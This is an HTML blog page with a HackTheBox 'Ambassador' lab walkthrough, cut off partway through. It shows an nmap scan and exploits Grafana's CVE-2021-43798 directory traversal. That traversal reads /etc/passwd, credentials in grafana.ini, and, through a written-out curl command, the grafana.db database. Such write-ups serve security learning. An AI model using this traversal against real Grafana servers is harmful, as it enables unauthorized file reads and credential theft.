@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Ambassador - Saad Akhtar</title><meta name="Description" content="HackTheBox medium machine Ambassador walkthrough."><meta property="og:title" content="HackTheBox - Ambassador" />
+<meta property="og:description" content="HackTheBox medium machine Ambassador walkthrough." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-ambassador/" /><meta property="og:image" content="/hackthebox-ambassador/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-28T07:00:21+05:00" />
+<meta property="article:modified_time" content="2023-01-28T07:00:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-ambassador/0.png"/>
+<meta name="twitter:title" content="HackTheBox - Ambassador"/>
+<meta name="twitter:description" content="HackTheBox medium machine Ambassador walkthrough."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-ambassador/" /><link rel="prev" href="/hackthebox-updown/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Ambassador",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-ambassador\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-ambassador\/0.png",
+                            "width":  1388 ,
+                            "height":  1058 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  1605 ,
+        "url": "\/hackthebox-ambassador\/","datePublished": "2023-01-28T07:00:21+05:00","dateModified": "2023-01-28T07:00:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "HackTheBox medium machine Ambassador walkthrough."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Ambassador</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-28">2023-01-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1605 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-ambassador/0.png"
+        data-srcset="/hackthebox-ambassador/0.png, /hackthebox-ambassador/0.png 1.5x, /hackthebox-ambassador/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-ambassador/0.png"
+        title="HackTheBox medium machine Ambassador walkthrough." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#using-metasploit">Using Metasploit</a></li>
+        <li><a href="#manual-exploit">Manual Exploit</a></li>
+      </ul>
+    </li>
+    <li><a href="#roottxt">root.txt</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Medium difficulty Machine Ambassador from HackTheBox.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>saad👻ssaadakhtarr<span class="o">)</span>-<span class="o">[</span>~/…/hackthebox/hackthebox/machines/ambassador<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -A -vv 10.10.11.183 -oN nmapN
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON  VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLYy5+VCwR+2NKWpIRhSVGI1nJQ5YeihevJqIYbfopEW03vZ9SgacRzs4coGfDbcYa+KPePbz2n+2zXytEPfzBzFysLXgTaUlDFcDqEsWP9pJ5UYFNfXqHCOyDRklsetFOBcxkgC8/IcHDJdJQTEr51KLF75ZXaEIcjZ+XuQWsOrU5DJPrAlCmG12OMjsnP4OfI4RpIjELuLCyVSItoin255/99SSM3koBheX0im9/V8IOpEye9Fc2LigyGA+97wwNSZG2G/duS6lE8pYz1unL+Vg2ogGDN85TkkrS3XdfDLI87AyFBGYniG8+SMtLQOd6tCZeymGK2BQe1k9oWoB7/J6NJ0dylAPAVZ1sDAU7KCUPNAex8q6bh0KrO/5zVbpwMB+qEq6SY6crjtfpYnd7+2DLwiYgcSiQxZMnY3ZkJiIf6s5FkJYmcf/oX1xm/TlP9qoxRKYqLtEJvAHEk/mK+na1Esc8yuPItSRaQzpCgyIwiZCdQlTwWBCVFJZqrXc<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFgGRouCNEVCXufz6UDFKYkcd3Lmm6WoGKl840u6TuJ8+SKv77LDiJzsXlqcjdeHXA5O87Us7Npwydhw9NYXXYs<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINujB7zPDP2GyNBT4Dt4hGiheNd9HOUMN/5Spa21Kg0W
+</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Ambassador Development Server
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: Hugo 0.94.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: HEAD GET POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3000/tcp open  ppp?    syn-ack
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   FourOhFourRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">302</span> Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: no-cache
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Expires: -1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Location: /login
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Pragma: no-cache
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">redirect_to</span><span class="o">=</span>%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Content-Type-Options: nosniff
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Frame-Options: deny
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">02</span> Oct <span class="m">2022</span> 12:24:49 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">29</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">302</span> Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: no-cache
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Expires: -1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Location: /login
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Pragma: no-cache
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">redirect_to</span><span class="o">=</span>%2F<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Content-Type-Options: nosniff
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Frame-Options: deny
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">02</span> Oct <span class="m">2022</span> 12:24:17 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">29</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/login&#34;</span>&gt;Found&lt;/a&gt;.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">302</span> Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: no-cache
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Expires: -1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Location: /login
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Pragma: no-cache
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Set-Cookie: <span class="nv">redirect_to</span><span class="o">=</span>%2F<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Content-Type-Options: nosniff
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Frame-Options: deny
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">02</span> Oct <span class="m">2022</span> 12:24:22 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Content-Length: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Protocol: <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Version: 8.0.30-0ubuntu0.20.04.2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Thread ID: <span class="m">95</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Capabilities flags: <span class="m">65535</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Some Capabilities: SwitchToSSLAfterHandshake, LongPassword, SupportsCompression, Speaks41ProtocolOld, FoundRows, InteractiveClient, LongColumnFlag, IgnoreSigpipes, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ODBCClient, ConnectWithDatabase, SupportsTransactions, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Status: Autocommit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Salt: m<span class="se">\x</span>0C
+</span></span><span class="line"><span class="cl"><span class="p">|</span> WCYIcc<span class="se">\x</span>0Ba,E!!2U<span class="p">|</span><span class="se">\x</span>1FM
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Auth Plugin Name: caching_sha2_password
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_tls-nextprotoneg: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_tls-alpn: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-cert: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There are multiple ports open so I&rsquo;ll start with port 80.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/1.png" title="Website on port 80" data-thumbnail="/hackthebox-ambassador/1.png" data-sub-html="<h2>Website on port 80</h2><p>Website on port 80</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/1.png"
+            data-srcset="/hackthebox-ambassador/1.png, /hackthebox-ambassador/1.png 1.5x, /hackthebox-ambassador/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/1.png" width="1366" height="581" />
+    </a><figcaption class="image-caption">Website on port 80</figcaption>
+    </figure></p>
+<p>It&rsquo;s a website made with <em>hugo</em> (a static site generator). On the website, there&rsquo;s a post in which a possible system user is revealed as <code>developer</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/3.png" title="Ambassador Development Server Post" data-thumbnail="/hackthebox-ambassador/3.png" data-sub-html="<h2>Ambassador Development Server Post</h2><p>Ambassador Development Server Post</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/3.png"
+            data-srcset="/hackthebox-ambassador/3.png, /hackthebox-ambassador/3.png 1.5x, /hackthebox-ambassador/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/3.png" width="1366" height="580" />
+    </a><figcaption class="image-caption">Ambassador Development Server Post</figcaption>
+    </figure></p>
+<p>Since I didn&rsquo;t find any unique domain name for the website, I added the usual htb pattern domain name in my <em>/etc/hosts</em> file as <code>ambassador.htb</code>.</p>
+<p>The website didn&rsquo;t provide much detail on further enum. I also tried directory brute forcing but it was also a dead end.</p>
+<p>Moving on to the other open port 3000.</p>
+<p>On browsing the port 3000 on a web browser, it redirects us to <code>http://ambassador.htb:3000/login</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/4.png" title="Website on port 3000" data-thumbnail="/hackthebox-ambassador/4.png" data-sub-html="<h2>Website on port 3000</h2><p>Website on port 3000</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/4.png"
+            data-srcset="/hackthebox-ambassador/4.png, /hackthebox-ambassador/4.png 1.5x, /hackthebox-ambassador/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/4.png" width="1366" height="576" />
+    </a><figcaption class="image-caption">Website on port 3000</figcaption>
+    </figure></p>
+<p>It&rsquo;s a Grafana Login page.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Grafana<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Grafana is an open source interactive data-visualization platform, developed by Grafana Labs, which allows users to see their data via charts and graphs that are unified into one dashboard (or multiple dashboards!) for easier interpretation and understanding.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://www.redhat.com/en/topics/data-services/what-is-grafana" target="_blank" rel="noopener noreffer ">https://www.redhat.com/en/topics/data-services/what-is-grafana</a></p>
+<p>Default credentials didn&rsquo;t work here. So I tried looking for exploits for grafana. The main login page also revealed that grafana <code>8.2.0</code> is running.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>The description of CVE-2021-43798 states<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Grafana versions 8.0.0-beta1 through 8.3.0 (except for patched versions) iss vulnerable to directory traversal, allowing access to local files.</div>
+        </div>
+    </div>
+<p>Source: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798" target="_blank" rel="noopener noreffer ">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798</a></p>
+<h2 id="foothold">Foothold</h2>
+<p>Trying out <a href="https://www.exploit-db.com/exploits/50581" target="_blank" rel="noopener noreffer ">this</a> exploit from exploit-db, we can read local files on the server.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/5.png" title="Reading the /etc/passwd file" data-thumbnail="/hackthebox-ambassador/5.png" data-sub-html="<h2>Reading the /etc/passwd file</h2><p>Reading the /etc/passwd file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/5.png"
+            data-srcset="/hackthebox-ambassador/5.png, /hackthebox-ambassador/5.png 1.5x, /hackthebox-ambassador/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/5.png" width="1344" height="497" />
+    </a><figcaption class="image-caption">Reading the /etc/passwd file</figcaption>
+    </figure></p>
+<p>Now since we can read the local files on the server, what can we read next? I tried reading the <code>/home/developer</code> files like <code>user.txt</code> or ssh keys but it didn&rsquo;t work because we possibly don&rsquo;t have enough privilege to read those files.</p>
+<p>Next I tried reading the default config files. <a href="https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/" target="_blank" rel="noopener noreffer ">This</a> blog post showed different default files of grafana we can read and get sensitive information from.</p>
+<p>The default config file <code>/etc/grafana/grafana.ini</code> contains the credentials for the login page.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/6.png" title="Reading the /etc/grafana/grafana.ini file" data-thumbnail="/hackthebox-ambassador/6.png" data-sub-html="<h2>Reading the /etc/grafana/grafana.ini file</h2><p>Reading the /etc/grafana/grafana.ini file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/6.png"
+            data-srcset="/hackthebox-ambassador/6.png, /hackthebox-ambassador/6.png 1.5x, /hackthebox-ambassador/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/6.png" width="1345" height="193" />
+    </a><figcaption class="image-caption">Reading the /etc/grafana/grafana.ini file</figcaption>
+    </figure></p>
+<p>And we get the credentials to login.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-ambassador/7.png" title="Grafana Dashboard" data-thumbnail="/hackthebox-ambassador/7.png" data-sub-html="<h2>Grafana Dashboard</h2><p>Grafana Dashboard</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/7.png"
+            data-srcset="/hackthebox-ambassador/7.png, /hackthebox-ambassador/7.png 1.5x, /hackthebox-ambassador/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-ambassador/7.png" width="1366" height="579" />
+    </a><figcaption class="image-caption">Grafana Dashboard</figcaption>
+    </figure></p>
+<p>I couldn&rsquo;t find much in the grafana dashboard. Upon further reading the above mentioned blog, we can also read a database file <code>/var/lib/grafana/grafana.db</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/…/hackthebox/hackthebox/machines/ambassador]
+</span></span><span class="line"><span class="cl">└─$ curl --path-as-is http://ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-ambassador/8.png" title="grafana.db" data-thumbnail="/hackthebox-ambassador/8.png" data-sub-html="<h2>grafana.db</h2><p>grafana.db</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-ambassador/8.png"
